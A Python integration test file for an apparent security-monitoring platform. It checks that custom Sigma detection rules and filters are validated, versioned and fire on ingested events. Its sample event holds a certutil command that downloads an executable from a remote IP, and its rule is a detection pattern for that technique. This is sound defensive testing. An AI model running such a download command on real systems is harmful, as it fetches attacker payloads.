"""Custom Sigma rules created through the API are validated, versioned and used by detection."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from typing import Any

import pytest

from sentinelx.security.ratelimit import limiter
from tests.helpers import make_tenant, signed_in
from tests.integration.test_api_flows import drain_jobs

RULE = """title: Custom - Certutil Download
id: 7d0c1e2a-1b2c-4d3e-8f90-112233445566
status: experimental
description: certutil used to download a file (living off the land).
logsource:
  category: process_creation
  product: windows
detection:
  sel:
    Image|endswith: '\\\\certutil.exe'
    CommandLine|contains|all: ['-urlcache', 'http']
  condition: sel
level: high
tags:
  - attack.command_and_control
  - attack.t1105
"""

EVENT = {
    "timestamp": "2026-10-06T09:40:00.000+0000",
    "id": "1791001900.9001",
    "rule": {"level": 3, "description": "Sysmon - Event 1: Process creation", "id": "61603", "groups": ["sysmon"]},
    "agent": {"id": "010", "name": "WS-099", "ip": "10.10.20.99"},
    "data": {
        "win": {
            "system": {"eventID": "1"},
            "eventdata": {
                "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
                "commandLine": "certutil.exe -urlcache -split -f http://198.51.100.40/x.exe x.exe",
                "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
                "user": "CORP\\\\bob",
            },
        }
    },
}


@pytest.fixture(autouse=True)
def _reset() -> None:
    limiter.reset()


async def test_custom_rule_lifecycle() -> None:
    tid = await make_tenant("Custom")
    async with signed_in(tid, "SUPER_ADMIN") as c:
        bad = await c.post("/api/v1/detections", json={"content": RULE.replace("|all", "|bogusmod")})
        assert bad.status_code == 422 and "unsupported modifier" in bad.json()["detail"]
        r = await c.post("/api/v1/detections", json={"content": RULE})
        assert r.status_code == 201, r.text
        uid = r.json()["rule_uid"]
        assert (await c.post("/api/v1/detections", json={"content": RULE})).status_code == 409

        r = await c.post("/api/v1/ingest/wazuh", json=[EVENT])
        assert r.json()["accepted"] == 1
        await drain_jobs()
        alerts: dict[str, Any] = (await c.get("/api/v1/alerts", params={"rule_uid": uid})).json()
        assert alerts["total"] == 1 and alerts["items"][0]["mitre_techniques"] == ["T1105"]

        r = await c.put(f"/api/v1/detections/{uid}", json={"content": RULE.replace("level: high", "level: critical")})
        assert r.status_code == 200 and r.json()["version"] == 2
        detail = (await c.get(f"/api/v1/detections/{uid}")).json()
        assert detail["rule"]["level"] == "critical" and len(detail["versions"]) == 2

        assert (await c.delete(f"/api/v1/detections/{uid}")).status_code == 204
        repo_rule = "ee71e69d-9a6d-45ba-b784-e94261bb0053"
        assert (await c.delete(f"/api/v1/detections/{repo_rule}")).status_code == 400
    async with signed_in(tid, "TENANT_ADMIN") as c:
        assert (await c.post("/api/v1/detections", json={"content": RULE})).status_code == 403


FILTER = """title: Ignore certutil downloads by the patching account
id: 7d0c1e2a-1b2c-4d3e-8f90-1122334455f1
status: experimental
description: The patch-management service legitimately downloads with certutil.
logsource:
  category: process_creation
  product: windows
filter:
  rules:
    - 7d0c1e2a-1b2c-4d3e-8f90-112233445566
  selection:
    User|endswith: '\\\\svc_patch'
  condition: not selection
"""


def _event(n: int, user: str) -> dict[str, Any]:
    e = json.loads(json.dumps(EVENT))
    e["id"] = f"1791001900.95{n:02d}"
    e["timestamp"] = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.000+0000")  # inside the dry-run window
    e["data"]["win"]["eventdata"]["user"] = user
    return e


async def test_custom_filter_suppresses_known_benign_activity() -> None:
    tid = await make_tenant("Filters")
    async with signed_in(tid, "SUPER_ADMIN") as c:
        rule_uid = (await c.post("/api/v1/detections", json={"content": RULE})).json()["rule_uid"]
        bad = await c.post("/api/v1/detections", json={"content": FILTER.replace("112233445566", "000000000000")})
        assert bad.status_code == 422 and "unknown rules" in bad.json()["detail"]
        r = await c.post("/api/v1/detections", json={"content": FILTER})
        assert r.status_code == 201, r.text
        filter_uid = r.json()["rule_uid"]
        try:
            detail = (await c.get(f"/api/v1/detections/{rule_uid}")).json()
            assert detail["filters"] == [{"rule_uid": filter_uid, "title": detail["filters"][0]["title"]}]
            fdetail = (await c.get(f"/api/v1/detections/{filter_uid}")).json()
            assert fdetail["rule"]["kind"] == "filter" and fdetail["filtered_rules"][0]["rule_uid"] == rule_uid

            r = await c.post("/api/v1/ingest/wazuh", json=[_event(1, "CORP\\\\svc_patch"), _event(2, "CORP\\\\eve")])
            assert r.json()["accepted"] == 2
            await drain_jobs()
            alerts = (await c.get("/api/v1/alerts", params={"rule_uid": rule_uid})).json()
            assert alerts["total"] == 1 and alerts["items"][0]["event_count"] == 1

            # Turning the filter off for this organization brings the excluded event back in a dry run.
            dry = (await c.post(f"/api/v1/detections/{rule_uid}/test", params={"hours": 168})).json()
            assert dry["matched"] == 1
            assert (await c.patch(f"/api/v1/detections/{filter_uid}", json={"enabled": False})).status_code == 200
            dry = (await c.post(f"/api/v1/detections/{rule_uid}/test", params={"hours": 168})).json()
            assert dry["matched"] == 2
        finally:
            assert (await c.delete(f"/api/v1/detections/{filter_uid}")).status_code == 204
            assert (await c.delete(f"/api/v1/detections/{rule_uid}")).status_code == 204
